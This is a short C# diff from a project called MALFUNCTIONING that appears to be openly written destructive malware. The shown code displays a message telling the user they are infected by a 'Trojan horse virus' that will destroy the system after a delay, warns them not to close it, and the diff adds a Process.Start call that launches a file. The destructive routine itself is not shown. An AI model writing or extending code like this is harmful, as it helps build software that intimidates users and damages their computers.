@@ -3,10 +3,11 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading.Tasks;
+using System.Threading;
 using System.IO;
 using static MALFUNCTIONING.api;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+using System.Diagnostics;
 
 namespace MALFUNCTIONING
 {
@@ -70,6 +71,7 @@ IT:[1|1+] - Startup delay time (in seconds)
                     $@"You have been infected by the malfunctioning Trojan horse virus. 
 The virus will destroy your system in {Variables.LatentperiodTime / 1000} seconds!" + (Variables.UnsafeMode ? "\nAlso, do not attempt to shut down this program. The consequences will be very serious." : "")
 );
+                Process.Start(file);
             }
             catch { }
             function.Sleep(Variables.LatentperiodTime);
